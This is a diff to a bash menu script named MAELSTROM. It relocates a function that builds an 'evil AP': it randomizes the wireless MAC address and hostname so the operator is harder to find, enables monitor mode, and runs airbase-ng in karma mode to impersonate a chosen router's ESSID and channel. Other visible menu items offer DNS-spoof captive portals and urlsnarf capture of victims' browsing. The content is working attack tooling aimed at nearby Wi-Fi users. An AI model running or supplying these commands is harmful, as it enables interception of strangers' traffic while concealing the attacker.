@@ -9,11 +9,11 @@ f_interface(){
 
 clear
 
-echo -e "\e[93m  MAELSTROM\e[0m"
+echo -e "\e[93mMAELSTROM\e[0m"
 echo
-echo -e "\e[4mChose your flavor:\e[24m"
+echo  "Chose your flavor : "
 echo
-echo -e "\e[34m1. Perform maelstrom\e[0m"
+echo -e "Normal \e[5mPerform maelstrom \e[25mNormal"
 echo "--------------------------------"
 echo "2. Perform accespoint-soft "
 echo "3. Perform accespoint-ssl "
@@ -30,7 +30,7 @@ read -p "Choice: " interfacechoice
 echo
 
   case $interfacechoice in
-    1) f_evilap ;;
+    	1) f_evilap ;;
 	2) f_accespoint-soft ;;
 	3) f_accespoint-ssl ;;
 	4) f_accespoint-dnspoof-captive ;;
@@ -43,6 +43,49 @@ echo
 }
 echo
 echo
+
+
+#evilap
+clear
+echo
+f_evilap(){
+	
+echo -e "\e[35mRolling MAC address and Hostname randomly to make you more difficult to find\e[0m"
+ifconfig wlan1 down
+macchanger -r wlan1
+echo
+echo -e "\e[35mYour new local mac adress:\e[0m"
+hn=`ifconfig wlan1 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
+hostname $hn
+echo $hn
+echo
+echo -e " \e[44mLet's GO\e[0m"
+echo -e "\e[31mStop previous wlan1mon\e[0m"
+airmon-ng stop wlan1mon
+
+#put wlan1 into monitor mode - wlan1mon created
+echo -e "\e[31mcreating the new wlan1mon from wlan1\e[0m"
+echo
+airmon-ng start wlan1
+echo -e "\e[92mIt's Ok\e[0m"
+clear
+
+
+#airbase-ng
+echo -e "\e[96mCreating the AP in bad karma\e[0m"
+echo
+echo -e "\e[93mTarget the channel of the wifi-router [1-13]\e[0m"
+echo -e "\e[93mTarget the name of the wifi-router\e[0m"
+echo
+read -p "Enter the Wi-Fi [1-13] : " channel
+read -p "Enter the Wi-Fi [ESSID] : " essid
+clear
+echo
+echo -e "\e[34mscreen session named : karma is running now\e[0m"
+echo -e "\e[34mcommand : screen -x karma to catch the screen\e[0m"
+sleep 5s
+screen -dmS karma airbase-ng -P -C 60 -y -e $essid -c $channel -v wlan1mon 
+}
 
 
 f_accespoint-soft(){
@@ -161,48 +204,6 @@ f_urlsnarf(){
 
    echo -e "\e[93mLogs saved to /sdcard/capture/urlsnarf/\e[0m"
    urlsnarf -i at0 >> /sdcard/capture/urlsnarf/urlsnarf_$(date +%F-%H%M).log
-}
-
-#evilap
-clear
-echo
-f_evilap(){
-	
-echo -e "\e[35mRolling MAC address and Hostname randomly to make you more difficult to find\e[0m"
-ifconfig wlan1 down
-macchanger -r wlan1
-echo
-echo -e "\e[35mYour new local mac adress:\e[0m"
-hn=`ifconfig wlan1 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
-hostname $hn
-echo $hn
-echo
-echo -e " \e[44mLet's GO\e[0m"
-echo -e "\e[31mStop previous wlan1mon\e[0m"
-airmon-ng stop wlan1mon
-
-#put wlan1 into monitor mode - wlan1mon created
-echo -e "\e[31mcreating the new wlan1mon from wlan1\e[0m"
-echo
-airmon-ng start wlan1
-echo -e "\e[92mIt's Ok\e[0m"
-clear
-
-
-#airbase-ng
-echo -e "\e[96mCreating the AP in bad karma\e[0m"
-echo
-echo -e "\e[93mTarget the channel of the wifi-router [1-13]\e[0m"
-echo -e "\e[93mTarget the name of the wifi-router\e[0m"
-echo
-read -p "Enter the Wi-Fi [1-13] : " channel
-read -p "Enter the Wi-Fi [ESSID] : " essid
-clear
-echo
-echo -e "\e[34mscreen session named : karma is running now\e[0m"
-echo -e "\e[34mcommand : screen -x karma to catch the screen\e[0m"
-sleep 5s
-screen -dmS karma airbase-ng -P -C 60 -y -e $essid -c $channel -v wlan1mon 
 }
 
 
